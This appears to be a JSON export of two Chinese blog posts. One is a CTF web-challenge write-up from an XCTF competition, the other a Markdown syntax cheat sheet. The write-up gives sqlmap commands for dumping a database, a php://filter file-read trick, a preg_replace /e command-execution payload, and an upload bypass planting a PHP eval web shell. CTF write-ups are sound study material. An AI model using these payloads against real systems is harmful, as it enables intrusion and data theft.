[{"title":"赛博地球杯网安大赛web部分Writeup","date":"2019-03-03T09:44:35.000Z","path":"2019/03/03/赛博地球杯网安大赛web部分Writeup/","text":"0X00 前言&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;菜却坚强…… 0X01 大量设备报表不见了&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;爆破id试试&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;id=2333时爆出flag 0X02 工控管理系统新版本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大致浏览一下有login.php，regist.php，findpwd.php这三个页面&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在findpwd.php页面发现搜索框存在sql注入并且fuzz测试无任何过滤，直接上sqlmap吧，懒得动手了 爆数据库名：cetc004 sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” –dbs 爆表名：user sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” -D cetc004 –tables 爆列名：answer,password,question,username sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” -D cetc004 -T user –columns 爆内容：没想多少干脆全爆出来，愣是跑了近一个小时，后悔了……其实只要将username爆出来就行了，密码是md5加密的，到处解没解出来 sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” -D cetc004 -T user -C “answer,password,question,username” –dump &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后两条信息是我创的，第一条是原本的网站管理账号，只要用管理账号的用户名再去注册一个账号再登录进去就能getflag了 0X03 工控云管理系统设备维护中心被植入后门http://111.198.29.45:32548/index.php?page=index看到这url第一反应就是文件包含 http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php 拿去base64解密关键部分代码： 123456789101112131415161718&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码审计可知要将XFF改为127.0.0.1才能触发后门。这是一个preg_replace()后门。/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。但要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含preg_replace() 的行中出现语法解析错误。payload: pat=/a/e&amp;rep=phpinfo()&amp;sub=a 之后可以通过system()等函数命令执行 pat=/a/e&amp;rep=system(“cat s3chahahaDir/flag/flag.php”)&amp;sub=a 查看源代码getflag 0X04题目给了源代码：123456789101112131415161718&lt;?php if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') &#123; include 'config.php'; $id = mysql_real_escape_string($_GET[id]); $sql=\"select * from cetc007.user where id='$id'\"; $result = mysql_query($sql); $result = mysql_fetch_object($result); &#125; else &#123; $result = False; die(); &#125; if(!$result)die(\"&lt;br &gt;something wae wrong ! &lt;br&gt;\"); if($result)&#123; echo \"id: \".$result-&gt;id.\"&lt;/br&gt;\"; echo \"name:\".$result-&gt;user.\"&lt;/br&gt;\"; $_SESSION['admin'] = True; &#125;?&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这一段代码中我们需要绕过if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#39;1&#39; &amp;&amp; substr($_GET[id], -1) === &#39;9&#39;)使$_SESSION[&#39;admin&#39;] = True。此外还有一个隐藏的限制：mysql查询结果的限制，id大了查询不到。我们可以构造id=1\\09来绕过这部分限制。 第二部分代码： 123456789101112131415&lt;?php if ($_SESSION['admin']) &#123; $con = $_POST['con']; $file = $_POST['file']; $filename = \"backup/\".$file; if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename))&#123; die(\"Bad file extension\"); &#125;else&#123; chdir('uploaded'); $f = fopen($filename, 'w'); fwrite($f, $con); fclose($f); &#125; &#125; ?&gt; 这里的$filename = &quot;backup/&quot;.$file;目录为假目录需要绕过。 正则表达式if(preg_match(&#39;/.+\\.ph(p[3457]?|t|tml)$/i&#39;, $filename))对文件后缀进行过滤 真实的上传目录为uploaded我们可以通过$file加../绕过假目录。正则匹配只匹配最后一个点的后缀，可以通过cryscat.php/.绕过。 payload(post) con=&lt;?php @eval($_POST[‘cryscat’]);?&gt;&amp;file=cryscat.php/. 之后用菜刀连接就行了，flag在html文件夹的flag.php文件中。","tags":[{"name":"XCTF","slug":"XCTF","permalink":"http://cryscat.com/tags/XCTF/"},{"name":"Writeup","slug":"Writeup","permalink":"http://cryscat.com/tags/Writeup/"}]},{"title":"Markdown语法","date":"2019-01-02T14:58:44.000Z","path":"2019/01/02/Markdown语法/","text":"快捷键撤销：Ctrl/Command + Z重做：Ctrl/Command + Y加粗：Ctrl/Command + B斜体：Ctrl/Command + I标题：Ctrl/Command + Shift + H无序列表：Ctrl/Command + Shift + U有序列表：Ctrl/Command + Shift + O检查列表：Ctrl/Command + Shift + C插入代码：Ctrl/Command + Shift + K插入链接：Ctrl/Command + Shift + L插入图片：Ctrl/Command + Shift + G 标题1级标题2级标题3级标题四级标题五级标题六级标题文本样式强调文本 强调文本 加粗文本 加粗文本 ==标记文本== 删除文本 引用文本 H~2~O is是液体。 2^10^ 运算结果是 1024。 列表 项目 项目 项目 项目1 项目2 项目3 计划任务 完成任务 链接链接: link. 图片: Alt 带尺寸的图片: =30x30 居中的图片: Alt 居中并且带尺寸的图片: =30x30 代码片下面展示一些 内联代码片。 12// A code blockvar foo = &apos;bar&apos;; 12// An highlighted blockvar foo = 'bar'; 表格 项目 Value 电脑 $1600 手机 $12 导管 $1 Column 1 Column 2 centered 文本居中 right-aligned 文本居右 自定义列表Markdown: Text-to-HTML conversion tool Authors: John: Luke 注脚一个具有注脚的文本。^1 注释Markdown将文本转换为 HTML。 *[HTML]: 超文本标记语言 LaTeX 数学公式Gamma公式展示 $\\Gamma(n) = (n-1)!\\quad\\foralln\\in\\mathbb N$ 是通过 Euler integral $$\\Gamma(z) = \\int_0^\\infty t^{z-1}e^{-t}dt\\,.$$ 插入甘特图1234567gantt dateFormat YYYY-MM-DD title Adding GANTT diagram functionality to mermaid section 现有任务 已完成 :done, des1, 2014-01-06,2014-01-08 进行中 :active, des2, 2014-01-09, 3d 计划中 : des3, after des2, 5d 插入UML图123456789sequenceDiagram张三 -&gt;&gt; 李四: 你好！李四, 最近怎么样?李四--&gt;&gt;王五: 你最近怎么样，王五？李四--x 张三: 我很好，谢谢!李四-x 王五: 我很好，谢谢!Note right of 王五: 李四想了很长时间, 文字太长了&lt;br/&gt;不适合放在一行.李四--&gt;&gt;张三: 打量着王五...张三-&gt;&gt;王五: 很好... 王五, 你怎么样? 插入Mermaid流程图12345graph LRA[长方形] -- 链接 --&gt; B((圆))A --&gt; C(圆角长方形)B --&gt; D&#123;菱形&#125;C --&gt; D 插入Flowchart流程图123456789flowchatst=&gt;start: 开始e=&gt;end: 结束op=&gt;operation: 我的操作cond=&gt;condition: 确认？st-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op","tags":[{"name":"Markdown","slug":"Markdown","permalink":"http://cryscat.com/tags/Markdown/"},{"name":"Hexo","slug":"Hexo","permalink":"http://cryscat.com/tags/Hexo/"}]}]